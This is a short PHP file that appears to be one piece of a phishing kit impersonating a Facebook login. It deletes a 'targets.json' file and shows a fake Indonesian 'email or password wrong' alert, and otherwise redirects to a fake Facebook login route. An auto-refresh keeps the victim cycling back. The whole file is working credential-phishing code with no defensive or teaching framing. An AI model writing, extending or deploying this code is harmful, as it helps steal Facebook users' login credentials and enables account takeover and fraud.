<?php
include("config.php");
if(file_exists("targets.json")){
  unlink("targets.json");
  echo "<script>alert('Email atau password salah!');</script>";
} else {
  header("Location: ".$url."/login/facebook");
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="refresh" content="1">
  <title></title>
</head>
<body>
  
</body>
</html>